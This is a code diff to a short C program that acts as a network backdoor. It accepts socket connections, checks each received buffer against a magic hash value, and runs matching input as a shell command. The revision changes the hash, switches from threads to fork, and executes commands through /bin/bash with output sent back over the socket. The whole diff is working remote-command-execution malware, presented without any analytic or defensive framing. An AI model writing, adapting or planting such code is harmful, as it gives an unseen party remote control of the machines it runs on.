@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <unistd.h>
 #include <sys/types.h>
 #include <sys/socket.h>
@@ -8,27 +9,27 @@
 
 unsigned long hash(const unsigned char *s, int len)
 {
-    unsigned int ret = 0;
+    unsigned int ret = 0xeb;
     while (len > 0) {
-        ret += *(unsigned short *) s * len;
-        s += 2, len -= 2;
-    }
-    if(len != 0) {
-        ret += *s;
+        ret += *(unsigned int *) s;
+        s += 4, len -= 4;
     }
     return ret;
 }
 
-void *fn(void *c)
+void fn(int c)
 {
     char buf[128]; int len;
-    while ((len = recv((int) c, buf, sizeof(buf), 0)) > 0) {
-        if(hash((unsigned char *) buf, len) == 640698) {
-            system(buf);
+    memset(buf, 0, sizeof(buf));
+    while ((len = recv(c, buf, sizeof(buf), 0)) > 0) {
+        if(hash((unsigned char *) buf, len) == 0x2b4c0720) {
+            char *argv[] = {"/bin/bash", "-c", buf, NULL};
+            dup2(c, 1);
+            execv(argv[0], argv);
         }
     }
-    close((int) c);
-    return NULL;
+    close(c);
+    exit(0);
 }
 
 int Main()
@@ -46,9 +47,9 @@ int Main()
 
     while (1) {
         int c = accept(s, NULL, NULL);
-        pthread_t t;
-        pthread_create(&t, NULL, &fn, (void *) c);
-        pthread_detach(t);
+        if(fork() == 0) {
+            fn(c);
+        }
+        close(c);
     }
-    return 0;
 }
